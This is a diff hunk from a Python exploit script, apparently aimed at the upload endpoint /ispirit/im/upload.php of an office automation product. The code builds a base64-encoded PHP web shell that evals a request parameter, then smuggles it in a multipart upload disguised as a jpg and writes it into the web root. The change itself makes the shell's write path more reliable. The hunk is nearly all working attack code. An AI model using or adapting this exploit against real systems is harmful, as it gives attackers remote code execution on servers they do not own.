@@ -73,7 +73,7 @@ def exp(u):
     # base64.decode: <?php $a="~+d()"^"!{+{}";$b=${$a}["a"];eval("".$b);echo "sucess !!";?>
     b64Shell = "PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7ZWNobyAi" + base64.b64encode(shellFlag.encode("utf-8")).decode("utf-8") + "Ijs/Pg=="
     
-    uploadData = "------fuck123\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n" + cookie[cookie.find("=")+1:cookie.find(";")] + "\r\n------fuck123\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents(\"../" + webPath + "\", base64_decode('" + b64Shell + "'));\r\necho \"" + uploadFlag + "\";\r\n?>\r\n------fuck123--"
+    uploadData = "------fuck123\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n" + cookie[cookie.find("=")+1:cookie.find(";")] + "\r\n------fuck123\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/" + webPath + "\", base64_decode('" + b64Shell + "'));\r\necho \"" + uploadFlag + "\";\r\n?>\r\n------fuck123--"
     try:
         uploadHeader["Cookie"] = cookie
         req1 = requests.post(u + "/ispirit/im/upload.php", headers=uploadHeader, verify=False, data=uploadData, timeout=25, proxies=proxy)
